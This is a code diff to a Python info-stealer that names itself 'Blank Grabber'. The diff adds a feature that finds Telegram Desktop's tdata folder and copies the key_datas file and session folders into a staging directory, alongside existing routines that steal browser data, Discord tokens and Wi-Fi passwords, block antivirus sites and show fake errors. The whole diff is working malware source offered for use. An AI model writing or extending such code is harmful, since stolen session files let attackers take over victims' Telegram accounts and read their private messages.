@@ -39,6 +39,7 @@ class Settings:
     CaptureWifiPasswords = bool("%capturewifipasswords%")
     CaptureSystemInfo = bool("%capturesysteminfo%")
     CaptureScreenshot = bool("%capturescreenshot%")
+    CaptureTelegram = bool("%capturetelegram%")
 
     FakeError = (bool("%fakeerror%"), ("%title%", "%message%", "%icon%"))
     BlockAvSites = bool("%blockavsites%")
@@ -704,6 +705,7 @@ class BlankGrabber:
     Screenshot: int = 0
     MinecraftSessions: int = 0
     WebcamPictures: int = 0
+    TelegramSessions: int = 0
 
     def __init__(self) -> None:
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n"
@@ -722,6 +724,7 @@ class BlankGrabber:
         for func, daemon in (
             (self.StealBrowserData, False),
             (self.StealDiscordTokens, False),
+            (self.StealTelegramSessions, False),
             (self.StealMinecraft, False),
             (self.GetAntivirus, False),
             (self.GetClipboard, False),
@@ -731,7 +734,7 @@ class BlankGrabber:
             (self.StealSystemInfo, False),
             (self.TakeScreenshot, False),
             (self.BlockSites, True),
-            (self.Webshot, True)
+            (self.Webshot, True),
         ):
             thread = Thread(target= func, daemon= daemon)
             thread.start()
@@ -1003,6 +1006,47 @@ class BlankGrabber:
         os.remove(tempCam)
     
     @Errors.Catch
+    def StealTelegramSessions(self) -> None:
+        if Settings.CaptureTelegram:
+            telegramPath = os.path.join(os.getenv("appdata"), "Telegram Desktop", "tdata")
+            loginPaths = []
+            files = []
+            dirs = []
+            has_key_datas = False
+
+            if os.path.isdir(telegramPath):
+                for item in os.listdir(telegramPath):
+                    path = os.path.join(telegramPath, item)
+                    if item == "key_datas":
+                        has_key_datas = True
+                        loginPaths.append(path)
+                    
+                    if os.path.isfile(path):
+                        files.append(item)
+                    else:
+                        dirs.append(item)
+                
+                for filename in files:
+                    for dirname in dirs:
+                        if dirname + "s"  == filename:
+                            loginPaths.extend([os.path.join(telegramPath, x) for x in (filename, dirname)])
+
+            if has_key_datas and len(loginPaths) - 1 > 0:
+                saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
+                os.makedirs(saveToDir, exist_ok= True)
+                for path in loginPaths:
+                    try:
+                        if os.path.isfile(path):
+                            shutil.copy(path, os.path.join(saveToDir, os.path.basename(path)))
+                        else:
+                            shutil.copytree(path, os.path.join(saveToDir, os.path.basename(path)), dirs_exist_ok= True)
+                    except Exception:
+                        shutil.rmtree(saveToDir)
+                        return
+                
+                self.TelegramSessions += int((len(loginPaths) - 1)/2)
+    
+    @Errors.Catch
     def StealDiscordTokens(self) -> None:
         if Settings.CaptureDiscordTokens:
             output = list()
@@ -1064,6 +1108,7 @@ class BlankGrabber:
                             "Cookies" : len(self.Cookies),
                             "History" : len(self.History),
                             "Roblox Cookies" : len(self.RobloxCookies),
+                            "Telegram Sessions" : self.TelegramSessions,
                             "Wifi Passwords" : len(self.WifiPasswords),
                             "Minecraft Sessions" : self.MinecraftSessions,
                             "Screenshot" : self.Screenshot,
